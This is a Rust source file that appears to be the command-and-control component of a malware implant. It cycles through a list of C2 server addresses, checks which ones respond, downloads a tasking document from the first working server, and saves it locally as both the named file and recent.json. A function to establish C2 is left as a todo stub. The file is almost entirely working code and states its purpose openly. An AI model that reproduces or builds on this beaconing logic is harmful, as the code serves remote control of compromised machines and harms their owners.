use std::{fs::File, io::Write};

// Command and Control logic
use log::{error, info};

// IPv4
type Addr = String;
type Docname = String;

pub fn get_commands(c2: Vec<Addr>, docname: Docname) {
    if c2.is_empty() {
        error!("no c2 server specified")
    }
    // no else needed, this loop has nothing to iterate over
    for addr in c2 {
        // once we find a valid c2 server, stop looking
        match try_callout(&addr) {
            Ok(_) => match download_doc(&addr, &docname) {
                Ok(_) => break,
                Err(e) => error!("{e}"),
            },
            Err(e) => error!("{e}"),
        }
    }
}

fn blocking_get(addr: &Addr) -> Result<String, String> {
    info!("blocking get to {addr}");
    if let Ok(response) = reqwest::blocking::get(addr) {
        if let Ok(body) = response.text() {
            Ok(body)
        } else {
            Err(format!("Could not read response body from {addr}"))
        }
    } else {
        Err(format!("No response from {addr}"))
    }
}

fn try_callout(dst: &Addr) -> Result<(), String> {
    info!("calling out to {dst}");
    match blocking_get(dst) {
        Ok(_) => Ok(info!("successfully called out to {dst}")),
        Err(msg) => Err(msg),
    }
}

fn download_doc(addr: &Addr, docname: &Docname) -> Result<(), String> {
    info!("downloading {:?} from {:?}", docname, addr);
    let mut dst: String = addr.clone();
    dst.push('/');
    dst.push_str(docname);

    match blocking_get(&dst) {
        Ok(body) => {
            try_file_write(docname, &body)?;
            try_file_write(&String::from("./recent.json"), &body)
        }
        Err(msg) => Err(msg),
    }
}

fn try_file_write(docname: &String, body: &str) -> Result<(), String> {
    info!("saving body {body} to {docname}");
    if let Ok(mut file) = File::create(docname) {
        match file.write_all(body.as_bytes()) {
            Ok(_) => Ok(info!("succesfully saved body to {docname}")),
            Err(e) => Err(format!("{e}")),
        }
    } else {
        Err(format!("could not save body to {docname}"))
    }
}

pub fn establish_c2() -> () {
    todo!("establish c2")
}
